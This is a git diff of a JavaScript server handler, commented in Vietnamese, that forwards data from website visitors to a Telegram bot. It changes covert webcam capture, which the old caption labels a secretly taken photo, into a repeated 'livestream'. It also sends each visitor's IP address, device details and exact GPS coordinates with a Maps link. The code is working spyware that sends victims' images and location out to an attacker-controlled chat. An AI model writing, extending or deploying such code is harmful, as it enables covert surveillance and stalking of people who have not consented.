@@ -14,19 +14,20 @@ export default async function handler(req, res) {
         let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
         if (ip.includes(',')) ip = ip.split(',')[0].trim();
 
-        // --- XỬ LÝ GỬI ẢNH WEBCAM (Trước & Sau) ---
-        if (data.type === "webcam") {
+        // --- XỬ LÝ GỬI ẢNH LIVESTREAM ---
+        if (data.type === "webcam_stream") {
             const base64Data = data.image.replace(/^data:image\/jpeg;base64,/, "");
             const buffer = Buffer.from(base64Data, 'base64');
 
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
-            formData.append('caption', `📸 *ẢNH CHỤP LÉN (CAM ${data.camera})*\nIP: \`${ip}\``);
+            formData.append('caption', `🎥 *LIVESTREAM (CAM ${data.camera})* - IP: \`${ip}\``);
             formData.append('parse_mode', 'Markdown');
             
             const blob = new Blob([buffer], { type: 'image/jpeg' });
-            formData.append('photo', blob, 'webcam.jpg');
+            formData.append('photo', blob, 'stream.jpg');
 
+            // Gửi ảnh lên Telegram
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
@@ -41,8 +42,6 @@ export default async function handler(req, res) {
             message = `📱 *THIẾT BỊ TRUY CẬP*\n\n*IP:* \`${ip}\`\n*Hệ điều hành:* ${data.platform}\n*Màn hình:* ${data.screen}\n*Trình duyệt:* ${data.userAgent}`;
         } else if (data.type === "gps") {
             message = `📍 *VỊ TRÍ GPS CHÍNH XÁC!*\n\n*IP:* \`${ip}\`\n*Vĩ độ:* ${data.lat}\n*Kinh độ:* ${data.lon}\n\n[🗺 Xem trên Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})`;
-        } else if (data.type === "gps_denied") {
-            message = `⚠️ *TỪ CHỐI GPS*\n*IP:* \`${ip}\`\nLỗi: ${data.error}`;
         }
 
         if (message) {
